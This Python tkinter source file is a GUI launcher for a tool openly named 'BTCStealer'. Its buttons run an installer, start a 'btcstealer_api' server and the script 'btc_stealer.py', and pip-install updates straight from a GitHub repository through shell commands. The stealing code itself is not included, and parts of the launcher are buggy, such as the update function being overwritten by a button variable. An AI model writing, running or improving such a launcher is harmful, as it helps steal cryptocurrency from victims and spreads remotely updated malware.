from tkinter import *
from subprocess import call
import os
from pathlib import Path
import time
import requests

path = str(Path.home() / "BTC")
version = 3
w = Tk()

def update():
    """Get the newest version of a repo"""
    try:
        r = requests.get("https://raw.githubusercontent.com/LopeKinz/BTC/master/version.txt")
        if int(r.text) > version:
            """Update the Label checkupdate if a new version is available"""
            checkupdate.config(text="New Version Available! Update Now?", fg="green")
            if input("(Y/N)").lower() == "y":
                """Update the Label checkupdate if a new version is available"""
                os.system(f"start cmd /c cd {path} && pip install --upgrade  git+https://www.github.com/LopeKinz/BTC.git")
                """Update the Label checkupdate if a new version is available"""
                checkupdate.config(text="Update Complete!", fg="green")
                """Update the Label checkupdate if a new version is available"""
                exit()
        else:
            checkupdate.config(text="You are up to date!", fg="green")
    except:
        pass

def startapi():
    try:
        try:
            os.system("start cmd /c uvicorn btcstealer_api:app")
            time.sleep(5)
            os.system(f"start cmd /c cd {path} && python btc_stealer.py")
        except:
            os.system("start cmd /c python -m uvicorn btcstealer_api:app")
            time.sleep(5)
            os.system(f"start cmd /c cd {path} && python btc_stealer.py")
    except:
        pass


def install():
    os.system(f"start cmd /c cd {path} && python installer.py")

w.geometry('500x200')

"""create a button for the function update"""

checkupdate = Label(w, text="Checking for Updates")
w.title("BTCStealer")
title1 = Label(w, text="BTCStealer")
title1.config(font=("Courier", 44))
install_requirements = Button(w, text="Install BTCStealer", command=install)
startapi_btn = Button(w, text = "Start BTCStealer", command=startapi)
update = Button(w, text="Check Update", command=update)
credit = Label(w, text="By Pinkyhax & Banhammer")
title1.pack()
install_requirements.pack()
startapi_btn.pack()
update.pack()
checkupdate.pack()
credit.pack()



w.mainloop()